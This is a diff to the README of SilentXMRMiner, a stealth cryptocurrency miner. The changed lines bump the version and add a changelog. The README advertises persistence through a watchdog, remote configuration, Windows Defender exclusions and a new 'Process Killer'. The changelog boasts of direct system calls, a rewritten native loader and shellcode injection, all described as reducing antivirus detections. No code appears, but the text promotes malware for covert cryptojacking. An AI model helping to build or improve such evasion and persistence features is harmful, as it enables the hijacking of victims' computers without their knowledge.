@@ -1,7 +1,7 @@
 
 <img src="https://github.com/UnamSanctam/SilentXMRMiner/blob/master/SilentXMRMiner.png?raw=true">
 
-# SilentXMRMiner v1.5.0 - Based on Lime Miner v0.3
+# SilentXMRMiner v1.5.1 - Based on Lime Miner v0.3
 
 Can mine all the following algorithms and thus all the cryptocurrencies that use them:
 <details>
@@ -52,7 +52,7 @@ Can mine all the following algorithms and thus all the cryptocurrencies that use
 * Watchdog - Replaces the miner file if removed and starts it if the injected miner is closed down
 * Remote Configuration - Can get the miner settings remotely from a URL every 100 minutes
 * Bypass Windows Defender - Adds exclusions into Windows Defender for the general folders the miner uses
-* Online Downloader - Can download the miner binary during runtime to greatly decrease file size
+* Process Killer - Constantly checks for any programs in the "Kill Targets" and kills them if found
 
 ## Downloads
 
@@ -68,6 +68,13 @@ You can find the new wiki [here](https://github.com/UnamSanctam/SilentXMRMiner/w
 
 ## Changelog
 
+### v1.5.1 (09/10/2021)
+* Added Process Killer feature that constantly checks for the "Kill Targets" programs and kills them if found
+* Changed system calls to direct system calls thus reducing detections
+* Changed native loader code to reduce detections
+* Removed Online Download feature due to domain being taken down
+* Improved overall code
+* Updated miner
 ### v1.5.0 (02/10/2021)
 **The previous version was supposed to be the last one before the unified miner but I recieved great results by loading everything by Shellcode making it worthwhile to update**
 * Added new Shellcode loader, the miner, watchdog and uninstaller will now be converted into shellcode and injected using a native C loader which greatly reduces detections
